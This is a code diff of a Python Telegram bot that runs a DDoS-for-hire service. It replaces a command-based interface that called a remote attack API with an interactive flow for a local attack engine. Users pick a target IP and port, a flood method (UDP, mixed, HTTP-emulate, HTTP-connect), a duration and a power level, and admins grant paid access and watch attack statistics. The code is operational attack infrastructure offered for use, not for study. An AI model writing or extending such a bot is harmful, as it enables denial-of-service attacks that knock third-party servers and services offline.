-        message += f"❌ Disapproved Users: {len(users) - approved_count}\n"
-        message += f"🎯 Total Attacks: {total_attacks}\n\n"
-        
-        message += "📋 User List:\n"
-        for idx, user in enumerate(users[:10], 1):  # Show first 10 users
-            # Safely get user_id
-            user_id = user.get('user_id', 'Unknown')
-            
-            # Get status
-            status = "✅" if user.get("approved", False) else "❌"
-            
-            # Check expiration if approved
-            if user.get("approved", False) and user.get("expires_at"):
-                try:
-                    expires_at = make_aware(user["expires_at"])
-                    current_time = get_current_time()
-                    if expires_at and expires_at > current_time:
-                        days_left = (expires_at - current_time).days
-                        status += f" ({days_left}d)"
-                    elif expires_at:
-                        status += " (Expired)"
-                except Exception:
-                    status += " (Date error)"
-            
-            # Get attack count
-            attacks_count = user.get("total_attacks", 0)
-            
-            # Add to message
-            message += f"{idx}. {user_id} {status} - {attacks_count} attacks\n"
-        
-        if len(users) > 10:
-            message += f"\n*And {len(users) - 10} more users...*"
-        
-        # Split message if too long (Telegram limit is 4096)
-        if len(message) > 4000:
-            message = message[:4000] + "\n\n... (truncated)"
-        
-        await update.message.reply_text(message)
-        
-    except Exception as e:
-        logger.error(f"Users command error: {e}")
-        await update.message.reply_text(f"❌ Error displaying users: {str(e)}")
+    users = db.get_all_users()
+    if not users:
+        await update.message.reply_text("No users")
+        return
+    msg = "👥 *User List*\n\n"
+    for u in users[:15]:
+        status = "✅" if u.get("approved") else "❌"
+        msg += f"{u['user_id']} {status} – {u.get('total_attacks',0)} attacks\n"
+    await update.message.reply_text(msg, parse_mode='Markdown')
 
-@admin_required
-async def blocked_ports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show blocked ports: /blockedports"""
-    blocked_ports_str = get_blocked_ports_list()
-    message = (
-        f"🚫 Blocked Ports\n\n"
-        f"The following ports are blocked and cannot be used for attacks:\n\n"
-        f"{blocked_ports_str}\n\n"
-        f"📊 Total blocked: {len(BLOCKED_PORTS)} ports\n\n"
-        f"✅ Allowed ports: All ports from {MIN_PORT} to {MAX_PORT} except the blocked ones."
-    )
-    
-    await update.message.reply_text(message)
-
-@admin_required
-async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show bot statistics: /stats"""
-    try:
-        users = db.get_all_users()
-        approved_users = [u for u in users if u.get("approved", False)]
-        total_attacks = sum(u.get("total_attacks", 0) for u in users)
-        
-        # Get recent attacks (last 24 hours)
-        yesterday = get_current_time() - timedelta(days=1)
-        recent_attacks = db.attacks.count_documents({"timestamp": {"$gte": yesterday}})
-        
-        # Get successful vs failed attacks
-        successful_attacks = db.attacks.count_documents({"status": "success"})
-        failed_attacks = db.attacks.count_documents({"status": "failed"})
-        
-        # Get API stats
-        api_stats = get_user_stats()
-        
-        message = (
-            f"📊 Bot Statistics\n\n"
-            f"👥 Users:\n"
-            f"• Total: {len(users)}\n"
-            f"• Approved: {len(approved_users)}\n"
-            f"• Pending: {len(users) - len(approved_users)}\n\n"
-            f"🎯 Attacks:\n"
-            f"• Total: {total_attacks}\n"
-            f"• Last 24h: {recent_attacks}\n"
-            f"• Successful: {successful_attacks}\n"
-            f"• Failed: {failed_attacks}\n\n"
-            f"🚫 Blocked Ports: {len(BLOCKED_PORTS)}\n"
-            f"🕐 Bot Uptime: Running"
-        )
-        
-        if api_stats.get("success"):
-            message += f"\n\n📡 API Stats:\n"
-            message += f"• Status: {api_stats.get('status', 'N/A')}\n"
-            message += f"• Days Remaining: {api_stats.get('daysRemaining', 'N/A')}"
-        
-        await update.message.reply_text(message)
-        
-    except Exception as e:
-        logger.error(f"Stats command error: {e}")
-        await update.message.reply_text(f"❌ Error displaying stats: {str(e)}")
-
-# User commands
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start command handler"""
-    try:
-        user_id = update.effective_user.id
-        username = update.effective_user.username
-        
-        # Create user if not exists
-        user = db.get_user(user_id)
-        if not user:
-            db.create_user(user_id, username)
-        
-        # Check if user is approved
-        if await is_user_approved(user_id):
-            user_data = db.get_user(user_id)
-            expires_at = user_data.get("expires_at")
-            days_left = 0
-            if expires_at:
-                expires_at = make_aware(expires_at)
-                days_left = (expires_at - get_current_time()).days
-                if days_left < 0:
-                    days_left = 0
-            
-            message = (
-                f"✅ Welcome back, {username or user_id}!\n\n"
-                f"Your account is active and ready to use.\n"
-                f"📅 Expires in: {days_left} days\n\n"
-                f"Available Commands:\n"
-                f"🔹 /attack ip port duration - Launch an attack\n"
-                f"🔹 /myattacks - Check your active attacks\n"
-                f"🔹 /myinfo - View your account info\n"
-                f"🔹 /mystats - View your attack statistics\n"
-                f"🔹 /blockedports - Show blocked ports\n"
-                f"🔹 /help - Show all commands\n\n"
-                f"⚠️ Disclaimer: Use responsibly. Misuse will result in a ban."
-            )
-        else:
-            message = (
-                f"❌ Access Denied, {username or user_id}!\n\n"
-                f"Your account is not approved yet.\n"
-                f"Please contact the administrator to get access.\n\n"
-                f"Once approved, you'll be able to use the bot's features."
-            )
-        
-        await update.message.reply_text(message)
-        
-    except Exception as e:
-        logger.error(f"Start command error: {e}")
-        await update.message.reply_text("❌ An error occurred. Please try again later.")
-
-async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Attack command: /attack ip port duration"""
+# ---------- Interactive Attack Setup Message Handler ----------
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
-    # Check if user is approved
     if not await is_user_approved(user_id):
-        await update.message.reply_text(
-            "❌ Access Denied!\n\n"
-            "Your account is not approved or has expired.\n"
-            "Please contact the administrator."
-        )
+        await update.message.reply_text("❌ Not approved")
         return
-    
-    # Check arguments
-    if len(context.args) != 3:
-        blocked_ports_str = get_blocked_ports_list()
-        await update.message.reply_text(
-            f"❌ Usage: /attack ip port duration\n\n"
-            f"Example: /attack 192.168.1.1 80 60\n\n"
-            f"Parameters:\n"
-            f"• ip - Target IP address\n"
-            f"• port - Port number (1-65535)\n"
-            f"• duration - Attack duration in seconds (1-300)\n\n"
-            f"🚫 Blocked Ports: {blocked_ports_str}"
-        )
-        return
-    
-    ip = context.args[0]
-    port_str = context.args[1]
-    duration_str = context.args[2]
-    
-    # Validate IP address
-    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
-    if not ip_pattern.match(ip):
-        await update.message.reply_text("❌ Invalid IP address format.")
-        return
-    
-    # Validate port
-    try:
-        port = int(port_str)
-        
-        # Check port range
-        if port < MIN_PORT or port > MAX_PORT:
-            await update.message.reply_text(
-                f"❌ Invalid port. Must be between {MIN_PORT} and {MAX_PORT}."
-            )
-            return
-        
-        # Check if port is blocked
-        if is_port_blocked(port):
-            blocked_ports_str = get_blocked_ports_list()
-            await update.message.reply_text(
-                f"❌ Port {port} is blocked!\n\n"
-                f"🚫 The following ports are blocked:\n"
-                f"{blocked_ports_str}\n\n"
-                f"Please use a different port."
-            )
-            return
-            
-    except ValueError:
-        await update.message.reply_text("❌ Invalid port. Please use a number between 1 and 65535.")
-        return
-    
-    # Validate duration
-    try:
-        duration = int(duration_str)
-        if duration < 1 or duration > 300:  # Max 5 minutes
-            await update.message.reply_text(
-                "❌ Invalid duration. Must be between 1 and 300 seconds (5 minutes)."
-            )
-            return
-    except ValueError:
-        await update.message.reply_text("❌ Invalid duration. Please use a number.")
-        return
-    
-    # Launch attack
-    status_msg = await update.message.reply_text(
-        f"🎯 Launching Attack...\n\n"
-        f"Target: {ip}:{port}\n"
-        f"Duration: {duration} seconds\n\n"
-        f"🔄 Please wait..."
-    )
-    
-    response = launch_attack(ip, port, duration)
-    
-    if response.get("success"):
-        attack_data = response.get("attack", {})
-        limits = response.get("limits", {})
-        account = response.get("account", {})
-        
-        message = (
-            f"✅ Attack Launched Successfully!\n\n"
-            f"🎯 Target: {ip}:{port}\n"
-            f"⏱️ Duration: {duration} seconds\n"
-            f"🆔 Attack ID: {attack_data.get('id', 'N/A')[:8]}...\n"
-            f"⏰ Ends At: {attack_data.get('endsAt', 'N/A')}\n\n"
-            f"📊 Your Limits:\n"
-            f"• Active Attacks: {limits.get('currentActive', 0)} / {limits.get('maxConcurrent', 0)}\n"
-            f"• Remaining Slots: {limits.get('remainingSlots', 0)}\n\n"
-            f"📅 Account:\n"
-            f"• Status: {account.get('status', 'N/A')}\n"
-            f"• Days Remaining: {account.get('daysRemaining', 0)}"
-        )
-        
-        # Log attack
-        db.log_attack(user_id, ip, port, duration, "success", str(response))
-        
-        await status_msg.edit_text(message)
-    else:
-        error_msg = response.get("error", "Unknown error")
-        details = response.get("message", "")
-        
-        message = (
-            f"❌ Attack Failed!\n\n"
-            f"Error: {error_msg}\n"
-            f"Details: {details}\n\n"
-            f"Possible reasons:\n"
-            f"• Invalid parameters\n"
-            f"• Port is blocked\n"
-            f"• Rate limit exceeded\n"
-            f"• Service temporarily unavailable"
-        )
-        
-        # Log failed attack
-        db.log_attack(user_id, ip, port, duration, "failed", str(response))
-        
-        await status_msg.edit_text(message)
 
-async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check user's active attacks"""
-    user_id = update.effective_user.id
-    
-    if not await is_user_approved(user_id):
-        await update.message.reply_text("❌ You are not approved to use this bot.")
-        return
-    
-    attacks = check_running_attacks()
-    
-    if attacks.get("success"):
-        active_attacks = attacks.get("activeAttacks", [])
-        if active_attacks:
-            message = f"🎯 Your Active Attacks ({len(active_attacks)})\n\n"
-            for attack in active_attacks:
-                message += (
-                    f"🔹 Target: {attack['target']}:{attack['port']}\n"
-                    f"   ⏱️ Expires in: {attack['expiresIn']}s\n\n"
-                )
-        else:
-            message = "✅ You have no active attacks running."
-        
-        message += f"\n📊 Usage: {attacks.get('count', 0)} / {attacks.get('maxConcurrent', 0)} concurrent attacks"
-    else:
-        message = f"❌ Failed to fetch attacks: {attacks.get('error', 'Unknown error')}"
-    
-    await update.message.reply_text(message)
+    step_data = user_data.get(user_id, {})
+    step = step_data.get('step')
+    text = update.message.text.strip()
 
-async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show user's account information"""
-    try:
-        user_id = update.effective_user.id
-        user = db.get_user(user_id)
-        
-        if not user:
-            await update.message.reply_text("❌ User not found. Please use /start first.")
+    if step == 'ip':
+        # validate IP
+        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
+            await update.message.reply_text("❌ Invalid IP. Send again:")
             return
-        
-        if user.get("approved"):
-            expires_at = user.get("expires_at")
-            if expires_at:
-                expires_at = make_aware(expires_at)
-                days_left = (expires_at - get_current_time()).days
-                hours_left = int((expires_at - get_current_time()).seconds / 3600)
-                if days_left >= 0:
-                    expires_str = f"{days_left} days, {hours_left} hours"
-                else:
-                    expires_str = "Expired"
+        step_data['ip'] = text
+        step_data['step'] = 'port'
+        user_data[user_id] = step_data
+        await update.message.reply_text(f"🔌 Send *port* (1-65535):\n🚫 Blocked: {get_blocked_ports_list()}", parse_mode='Markdown')
+    elif step == 'port':
+        try:
+            port = int(text)
+            if port < 1 or port > 65535 or is_port_blocked(port):
+                await update.message.reply_text("❌ Invalid or blocked port")
+                return
+            step_data['port'] = port
+            step_data['step'] = 'method'
+            user_data[user_id] = step_data
+            keyboard = [
+                [InlineKeyboardButton("🔥 UDP", callback_data="method_udp")],
+                [InlineKeyboardButton("💣 Mixed", callback_data="method_mixed")],
+                [InlineKeyboardButton("🦊 HTTP-Emulate", callback_data="method_http_emulate")],
+                [InlineKeyboardButton("⚡ HTTP-Connect", callback_data="method_http_connect")],
+                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
+            ]
+            await update.message.reply_text("⚡ Select attack method:", reply_markup=InlineKeyboardMarkup(keyboard))
+        except:
+            await update.message.reply_text("❌ Send a number")
+    elif step == 'duration':
+        try:
+            duration = int(text)
+            if duration < 5 or duration > 300:
+                await update.message.reply_text("❌ Duration 5-300 seconds")
+                return
+            ip = step_data['ip']
+            port = step_data['port']
+            method = step_data.get('method', 'udp')
+            # Confirm
+            keyboard = [
+                [InlineKeyboardButton("✅ START ATTACK", callback_data="confirm_start")],
+                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_setup")]
+            ]
+            await update.message.reply_text(
+                f"🔥 *Confirm Attack*\n\n"
+                f"🎯 `{ip}:{port}`\n"
+                f"⚙️ Method: `{method.upper()}`\n"
+                f"⏱️ Duration: `{duration}s`\n"
+                f"🧵 Power: `{POWER_LEVEL}x`\n\n"
+                f"Start?",
+                parse_mode='Markdown',
+                reply_markup=InlineKeyboardMarkup(keyboard)
+            )
+            step_data['final'] = (ip, port, duration, method)
+            user_data[user_id] = step_data
+            step_data['step'] = 'confirm'
+        except:
+            await update.message.reply_text("❌ Send number (seconds)")
+
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    data = query.data
+
+    if data == "cancel_setup":
+        if user_id in user_data:
+            del user_data[user_id]
+        await query.edit_message_text("❌ Setup cancelled")
+        return
+
+    # Method selection
+    if data.startswith("method_"):
+        method = data.replace("method_", "")
+        if user_id not in user_data:
+            user_data[user_id] = {}
+        user_data[user_id]['method'] = method
+        user_data[user_id]['step'] = 'duration'
+        await query.edit_message_text(f"✅ Method: `{method.upper()}`\n⏱️ Send duration (5-300 seconds):", parse_mode='Markdown')
+        return
+
+    # Confirm start
+    if data == "confirm_start":
+        if user_id not in user_data or 'final' not in user_data[user_id]:
+            await query.edit_message_text("❌ Session expired. Use /start")
+            return
+        ip, port, duration, method = user_data[user_id]['final']
+        del user_data[user_id]
+
+        # Create send function for attack monitor
+        async def send_func(text, markup, edit=False, msg_id=None):
+            if edit and msg_id:
+                await query.message.reply_text(text, parse_mode='Markdown', reply_markup=markup)
+                return None
             else:
-                expires_str = "Never"
-            
-            approved_at_str = user.get('approved_at').strftime('%Y-%m-%d') if user.get('approved_at') else 'N/A'
-            created_at_str = user.get('created_at').strftime('%Y-%m-%d') if user.get('created_at') else 'N/A'
-            
-            message = (
-                f"📋 Your Account Information\n\n"
-                f"🆔 User ID: {user['user_id']}\n"
-                f"👤 Username: @{user.get('username', 'N/A')}\n"
-                f"✅ Status: Approved\n"
-                f"📅 Approved On: {approved_at_str}\n"
-                f"⏰ Expires In: {expires_str}\n"
-                f"📊 Total Attacks: {user.get('total_attacks', 0)}\n"
-                f"📅 Member Since: {created_at_str}"
-            )
-        else:
-            created_at_str = user.get('created_at').strftime('%Y-%m-%d') if user.get('created_at') else 'N/A'
-            
-            message = (
-                f"❌ Account Not Approved\n\n"
-                f"🆔 User ID: {user['user_id']}\n"
-                f"👤 Username: @{user.get('username', 'N/A')}\n"
-                f"📅 Member Since: {created_at_str}\n\n"
-                f"Please contact the administrator to get access."
-            )
-        
-        await update.message.reply_text(message)
-        
-    except Exception as e:
-        logger.error(f"Myinfo command error: {e}")
-        await update.message.reply_text("❌ Error retrieving user information.")
+                return await query.message.reply_text(text, parse_mode='Markdown', reply_markup=markup)
 
-async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show user's attack statistics"""
-    user_id = update.effective_user.id
-    
-    if not await is_user_approved(user_id):
-        await update.message.reply_text("❌ You are not approved to use this bot.")
+        # Run attack in thread (since launch_attack is blocking and uses threading internally)
+        def run_attack():
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            # We need to make send_func awaitable inside thread? Actually send_func is async.
+            # Simpler: Use a synchronous wrapper? But we already have async.
+            # Instead, we run the attack in a thread and use asyncio.run_coroutine?
+            # I'll refactor launch_attack to be synchronous and use a callback that posts updates.
+            # For simplicity, I'll just launch the attack and use the existing sync functions.
+            # But send_func is async – we can't call it from thread. Let me change approach:
+            # I'll move the attack launcher to a separate function that takes a sync callback.
+            pass
+
+        # Better: create a sync callback that uses asyncio.run_coroutine_threadsafe
+        loop = asyncio.get_event_loop()
+        def sync_send(text, markup, edit=False, msg_id=None):
+            future = asyncio.run_coroutine_threadsafe(
+                send_func(text, markup, edit, msg_id), loop
+            )
+            return future.result() if future.result() else None
+
+        # Now launch attack in a thread with sync callback
+        thread = threading.Thread(target=launch_attack, args=(ip, port, duration, method, sync_send), daemon=True)
+        thread.start()
+        await query.edit_message_text("🔥 Attack initializing...")
         return
-    
-    stats = db.get_user_attack_stats(user_id)
-    
-    success_rate = (stats['successful']/stats['total']*100 if stats['total'] > 0 else 0)
-    
-    message = (
-        f"📊 Your Attack Statistics\n\n"
-        f"🎯 Total Attacks: {stats['total']}\n"
-        f"✅ Successful: {stats['successful']}\n"
-        f"❌ Failed: {stats['failed']}\n"
-        f"📈 Success Rate: {success_rate:.1f}%\n\n"
-    )
-    
-    if stats['recent']:
-        message += "🕐 Recent Attacks:\n"
-        for attack in stats['recent'][:5]:
-            status_icon = "✅" if attack['status'] == "success" else "❌"
-            if attack.get('timestamp'):
-                timestamp = make_aware(attack['timestamp'])
-                time_ago = (get_current_time() - timestamp).seconds // 60
-                message += (
-                    f"{status_icon} {attack['ip']}:{attack['port']} - "
-                    f"{attack['duration']}s - {time_ago}m ago\n"
+
+    # Inline buttons during attack
+    global attack_running, current_attack
+    if data == "stop_attack":
+        if attack_running:
+            attack_running = False
+            await query.edit_message_text("🛑 Attack stopped by user")
+        else:
+            await query.answer("No attack running")
+    elif data == "info_attack":
+        if attack_running:
+            with attack_lock:
+                pkt = current_attack['packets']
+                elapsed = int(time.time() - current_attack['start_time'])
+                remaining = current_attack['duration'] - elapsed
+                speed = int(pkt/elapsed) if elapsed else 0
+                info = (
+                    f"ℹ️ *Attack Info*\n\n"
+                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
+                    f"⚙️ Method: `{current_attack['method'].upper()}`\n"
+                    f"📦 Packets: `{pkt:,}`\n"
+                    f"⏱️ Elapsed: `{elapsed}/{current_attack['duration']}s`\n"
+                    f"💥 Speed: `{speed:,}` pps\n"
+                    f"📡 Status: `ACTIVE`"
                 )
-    
-    await update.message.reply_text(message)
+            await query.edit_message_text(info, parse_mode='Markdown')
+        else:
+            await query.edit_message_text("ℹ️ No attack running")
+    elif data == "refresh_attack":
+        if attack_running:
+            with attack_lock:
+                pkt = current_attack['packets']
+                elapsed = int(time.time() - current_attack['start_time'])
+                remaining = current_attack['duration'] - elapsed
+                progress = int((elapsed / current_attack['duration']) * 20)
+                bar = "█" * progress + "░" * (20 - progress)
+                speed = int(pkt/elapsed) if elapsed else 0
+                text = (
+                    f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
+                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
+                    f"⚙️ Method: `{current_attack['method'].upper()}`\n"
+                    f"📦 Packets: `{pkt:,}`\n"
+                    f"⏱️ Time: `{elapsed}/{current_attack['duration']}s`\n"
+                    f"📊 `[{bar}]`\n"
+                    f"💥 Speed: `{speed:,}` pps\n\n"
+                    f"🔘 *Buttons below*"
+                )
+                keyboard = [
+                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
+                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")],
+                    [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_attack")]
+                ]
+                await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
+        else:
+            await query.edit_message_text("✅ No active attack")
+    elif data == "cancel_attack":
+        if user_id in user_data:
+            del user_data[user_id]
+        await query.edit_message_text("❌ Cancelled")
 
-async def blocked_ports_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show blocked ports for users"""
-    blocked_ports_str = get_blocked_ports_list()
-    message = (
-        f"🚫 Blocked Ports\n\n"
-        f"The following ports are blocked and cannot be used for attacks:\n\n"
-        f"{blocked_ports_str}\n\n"
-        f"📊 Total blocked: {len(BLOCKED_PORTS)} ports\n\n"
-        f"✅ Allowed ports: All ports from {MIN_PORT} to {MAX_PORT} except the blocked ones.\n\n"
-        f"💡 Tip: Use common ports like 80, 8080, 25565, etc."
-    )
-    
-    await update.message.reply_text(message)
+async def error_handler(update, context):
+    logger.error(f"Update {update} caused {context.error}")
 
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show help menu"""
-    user_id = update.effective_user.id
-    is_admin = user_id in ADMIN_IDS
-    is_approved = await is_user_approved(user_id)
-    
-    message = "🤖 Bot Commands\n\n"
-    
-    # User commands
-    message += "📱 User Commands:\n"
-    message += "🔹 /start - Start the bot\n"
-    message += "🔹 /help - Show this help menu\n"
-    
-    if is_approved:
-        message += "🔹 /attack ip port duration - Launch an attack\n"
-        message += "🔹 /myattacks - Check your active attacks\n"
-        message += "🔹 /myinfo - View your account info\n"
-        message += "🔹 /mystats - View your attack statistics\n"
-        message += "🔹 /blockedports - Show blocked ports\n"
-    
-    # Admin commands
-    if is_admin:
-        message += "\n👑 Admin Commands:\n"
-        message += "🔹 /approve userid days - Approve a user\n"
-        message += "🔹 /disapprove userid - Disapprove a user\n"
-        message += "🔹 /users - List all users\n"
-        message += "🔹 /status - Check API health\n"
-        message += "🔹 /running - Check running attacks\n"
-        message += "🔹 /stats - View bot statistics\n"
-        message += "🔹 /blockedports - Show blocked ports (admin)\n"
-    
-    message += "\n⚠️ Disclaimer: Misuse of this bot will result in immediate ban."
-    
-    await update.message.reply_text(message)
-
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle errors"""
-    logger.error(f"Update {update} caused error {context.error}")
-    
-    if update and update.effective_message:
-        await update.effective_message.reply_text(
-            "❌ An error occurred. Please try again later or contact administrator."
-        )
-
+# ---------- Main ----------
 def main():
-    """Main function to run the bot"""
-    # Create application
-    
-    application = Application.builder().token(BOT_TOKEN).build()
-    try:
-       ip = requests.get('https://ifconfig.me', timeout=5).text.strip()
-    except Exception:
-       ip = "Unknown"
-    
-    # Admin commands
-    application.add_handler(CommandHandler("approve", approve_command))
-    application.add_handler(CommandHandler("disapprove", disapprove_command))
-    application.add_handler(CommandHandler("status", status_command))
-    application.add_handler(CommandHandler("running", running_command))
-    application.add_handler(CommandHandler("users", users_command))
-    application.add_handler(CommandHandler("stats", stats_command))
-    application.add_handler(CommandHandler("blockedports", blocked_ports_command))
-    
-    # User commands
-    application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("attack", attack_command))
-    application.add_handler(CommandHandler("myattacks", myattacks_command))
-    application.add_handler(CommandHandler("myinfo", myinfo_command))
-    application.add_handler(CommandHandler("mystats", mystats_command))
-    application.add_handler(CommandHandler("blockedports", blocked_ports_user_command))
-    
-    # Error handler
-    application.add_error_handler(error_handler)
-    
-    # Start bot
-    print("🤖 Bot is starting...")
-    print(f"Server IP: {ip}")
-    print(f"📊 MongoDB: Connected and indexes optimized.")
-    print(f"👑 Admin IDs: {ADMIN_IDS}")
-    print(f"🌐 API URL: {API_URL}")
-    print(f"🔑 API Key: {API_KEY[:10]}...")
-    print(f"🚫 Blocked Ports: {get_blocked_ports_list()}")
-    print("✅ Bot is running!")
-    
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    print("⚡ Merged DDoS Bot (MongoDB + Local Engine + Inline Buttons)")
+    print(f"👑 Admins: {ADMIN_IDS}")
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start_command))
+    app.add_handler(CommandHandler("power", power_command))
+    app.add_handler(CommandHandler("stop", stop_command))
+    app.add_handler(CommandHandler("myinfo", myinfo_command))
+    app.add_handler(CommandHandler("mystats", mystats_command))
+    app.add_handler(CommandHandler("blockedports", blocked_ports_command))
+    app.add_handler(CommandHandler("help", help_command))
+    # Admin
+    app.add_handler(CommandHandler("approve", approve_command))
+    app.add_handler(CommandHandler("disapprove", disapprove_command))
+    app.add_handler(CommandHandler("users", users_command))
+    # Handlers
+    app.add_handler(CallbackQueryHandler(button_callback))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+    app.add_error_handler(error_handler)
+    print("✅ Bot is running...")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
     main()
